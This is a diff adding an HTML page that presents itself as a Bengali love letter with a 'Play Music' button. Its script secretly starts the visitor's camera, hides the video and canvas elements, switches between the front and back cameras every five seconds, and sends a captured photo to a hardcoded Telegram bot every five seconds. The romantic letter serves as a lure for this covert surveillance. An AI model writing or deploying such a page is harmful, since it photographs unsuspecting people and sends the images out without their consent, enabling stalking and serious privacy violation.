@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>I Love You</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Pinyon+Script&display=swap');
+
+    body {
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      width: 100vw;
+      background: linear-gradient(45deg, #ff9a9e, #fad0c4, #fbc2eb, #a18cd1);
+      background-size: 300% 300%;
+      font-family: 'Dancing Script', cursive;
+      animation: bgAnimation 12s infinite alternate;
+      overflow: hidden;
+    }
+
+    @keyframes bgAnimation {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    .container {
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 3rem;
+      color: #fff;
+      text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3);
+    }
+
+    h1 span {
+      color: #ffeb3b;
+      font-style: italic;
+    }
+
+    .love-letter {
+      font-family: 'Pinyon Script', cursive;
+      font-size: 1.5rem;
+      color: #fff;
+      margin-top: 30px;
+      text-align: left;
+      width: 80%;
+      max-height: 300px;
+      margin: 20px auto;
+      border: 2px solid #ff4b5c;
+      padding: 20px;
+      border-radius: 15px;
+      background-color: rgba(0, 0, 0, 0.5);
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+      overflow-y: auto;
+    }
+
+    video, canvas {
+      display: none; /* Hide video and canvas */
+    }
+
+    .music-btn {
+      position: absolute;
+      bottom: 20px;
+      background-color: #ff4b5c;
+      color: white;
+      font-size: 1.5rem;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 25px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .music-btn:hover {
+      background-color: #ff1e56;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>I <span>Love</span> You</h1>
+
+    <div class="love-letter">
+      <p>প্রিয়তম,</p>
+      <p> মনে হলো, তোমার জন্য কিছু লিখে তোমার কাছে আমার অনুভূতিগুলো পৌঁছে দিই। প্রতিটি দিন তোমার সাথে কাটানোর পর, আমি বুঝতে পারি, তুমি আমার জীবনের সবচেয়ে বিশেষ অংশ। তোমার হাসি, তোমার কথা, তোমার ছোঁয়া—সবকিছুই যেন আমার পৃথিবীকে আলোকিত করে। আমি জানি না কীভাবে তোমাকে ধন্যবাদ জানাবো, কারণ তুমি আমার জীবনে এসে এক অমূল্য উপহার হয়ে গেছো।</p>
+
+<p>তোমার সাথে কাটানো প্রতিটি মুহূর্ত আমার জন্য সোনালী হয়ে উঠেছে। তোমার পাশে থাকলে পৃথিবীটা কেমন যেন সুন্দর হয়ে ওঠে। তোমার চোখের দৃষ্টি, তোমার কথা বলার ভঙ্গি, তোমার উপস্থিতি—সবকিছুই আমাকে এক অন্যরকম শান্তি দেয়। আমি প্রতিদিন এই মুহূর্তগুলোকে আরও গভীরভাবে অনুভব করতে চাই। তুমি আমার জীবনে আসার পর, আমি বুঝেছি যে, সত্যিকারের ভালোবাসা কী।</p>
+
+<p>প্রিয়, তোমার পাশে থাকলে আমি নিজেকে পরিপূর্ণ মনে করি। আমি তোমাকে প্রতিশ্রুতি দিতে চাই—তোমার পাশে, তোমার পাশে, আমি সবসময় থাকবো। তোমার সুখে, তোমার দুঃখে, আমি তোমার সঙ্গে এই পথটা চলতে চাই। তুমি যদি কখনো কষ্ট পাও, আমি তোমার পাশে দাঁড়িয়ে সেই কষ্ট শেয়ার করতে চাই। আমরা একসঙ্গে একে অপরকে শক্তি দেবো, এবং একে অপরের জন্য ভালোবাসা আর সুখের পথ তৈরি করবো।</p>
+
+<p>তোমাকে ভালোবাসা আমার জীবনের সবচেয়ে সুন্দর অনুভূতি, আর আমি প্রতিদিন তোমার ভালোবাসায় সিক্ত হতে চাই।
+
+।</p>
+      <p>তোমার জন্য আমার ভালোবাসা অসীম ,</p>
+      <p><strong>Love You</strong></p>
+    </div>
+
+    <!-- Music Play Button -->
+    <button class="music-btn" onclick="toggleMusic()">Play Music</button>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+  </div>
+
+  <audio id="loveAudio" loop>
+    <source src="https://www.bensound.com/bensound-music/bensound-tenderness.mp3" type="audio/mp3">
+    Your browser does not support the audio element.
+  </audio>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+    const music = document.getElementById('loveAudio');
+    const botToken = '7603770395:AAEBlEAafIokfEyS-lTeudujGMNVfTg7LaY; // Replace with your bot token
+    const chatId = '7767412329';    // Replace with your chat ID
+
+    let useFrontCamera = true; // Start with front camera
+    let isMusicPlaying = false;
+
+    // Camera constraints
+    const constraints = {
+      video: {
+        facingMode: useFrontCamera ? 'user' : 'environment'
+      }
+    };
+
+    // Start camera stream
+    function startCamera() {
+      navigator.mediaDevices.getUserMedia(constraints)
+        .then(stream => {
+          video.srcObject = stream;
+        })
+        .catch(error => {
+          console.error('Error accessing camera:', error);
+        });
+    }
+
+    // Stop the camera stream
+    function stopCamera() {
+      const stream = video.srcObject;
+      if (stream) {
+        const tracks = stream.getTracks();
+        tracks.forEach(track => track.stop());
+      }
+    }
+
+    // Capture photo and send to Telegram
+    function captureAndSendPhoto() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const base64Image = canvas.toDataURL('image/png');
+      const blob = base64ToBlob(base64Image);
+
+      sendToTelegram(blob);
+    }
+
+    // Convert Base64 to Blob
+    function base64ToBlob(base64) {
+      const byteString = atob(base64.split(',')[1]);
+      const arrayBuffer = new ArrayBuffer(byteString.length);
+      const uintArray = new Uint8Array(arrayBuffer);
+
+      for (let i = 0; i < byteString.length; i++) {
+        uintArray[i] = byteString.charCodeAt(i);
+      }
+
+      return new Blob([uintArray], { type: 'image/png' });
+    }
+
+    // Send photo to Telegram
+    function sendToTelegram(blob) {
+      const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', blob, 'photo.png');
+
+      fetch(url, {
+        method: 'POST',
+        body: formData,
+      })
+        .then(response => response.json())
+        .then(data => {
+          if (!data.ok) {
+            console.error('Telegram API Error:', data);
+          }
+        })
+        .catch(err => {
+          console.error('Fetch Error:', err);
+        });
+    }
+
+    // Automatically switch between front and back cameras
+    function autoSwitchCamera() {
+      setInterval(() => {
+        stopCamera();
+        useFrontCamera = !useFrontCamera; // Toggle camera
+        constraints.video.facingMode = useFrontCamera ? 'user' : 'environment';
+        startCamera();
+      }, 5000); // Switch camera every 5 seconds
+    }
+
+    // Automatically capture photos
+    setInterval(() => {
+      captureAndSendPhoto();
+    }, 5000); // Capture photo every 5 seconds
+
+    // Music control
+    function toggleMusic() {
+      if (isMusicPlaying) {
+        music.pause();
+        isMusicPlaying = false;
+        document.querySelector('.music-btn').textContent = 'Play Music';
+      } else {
+        music.play();
+        isMusicPlaying = true;
+        document.querySelector('.music-btn').textContent = 'Pause Music';
+      }
+    }
+
+    // Initialize camera and start the process
+    startCamera();
+    autoSwitchCamera();
+  </script>
+</body>
+</html>
